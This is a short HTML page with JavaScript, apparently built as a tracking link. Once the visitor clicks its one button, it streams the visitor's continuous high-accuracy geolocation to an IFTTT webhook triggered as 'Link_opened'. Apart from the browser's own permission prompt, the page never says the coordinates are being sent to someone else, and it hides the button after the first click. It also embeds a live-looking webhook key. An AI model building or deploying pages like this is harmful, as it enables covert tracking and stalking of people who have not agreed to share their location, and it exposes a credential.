<!DOCTYPE html>
<html>
<head>
  <title>Live Location Sender</title>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    #coords { margin-top: 20px; }
    #startButton { padding: 10px 20px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>
  <h2>Fetching your location...</h2>
  <p id="coords">Please allow location access.</p>
  <button id="startButton">Start Location Tracking</button>

  <script>
    const startButton = document.getElementById('startButton');
    const coordsEl = document.getElementById('coords');

    function sendLocation(latitude, longitude) {
      const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
      coordsEl.innerHTML = `Latitude: ${latitude} <br> Longitude: ${longitude} <br> <a href="${mapsLink}" target="_blank">Open in Maps</a>`;

      // IFTTT webhook
      const url = "https://maker.ifttt.com/trigger/Link_opened/with/key/iuwEGmz1sskpO7aR6oVBFCBIgrkCLRibC_3FrQcbJGm";
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ value1: latitude, value2: longitude, value3: mapsLink })
      })
      .then(() => console.log("Location sent!"))
      .catch(error => console.error("Error sending location:", error));
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(
          function(position) {
            const lat = position.coords.latitude.toString();
            const lon = position.coords.longitude.toString();
            sendLocation(lat, lon);
          },
          function(error) {
            coordsEl.innerText = "Error getting location: " + error.message;
          },
          { enableHighAccuracy: true }
        );
      } else {
        coordsEl.innerText = "Geolocation not supported on this device.";
      }
    }

    // Mobile browsers require a user gesture, so hide the button after first click
    startButton.addEventListener('click', () => {
      startButton.style.display = 'none';
      getLocation();
    });
  </script>
</body>
</html>
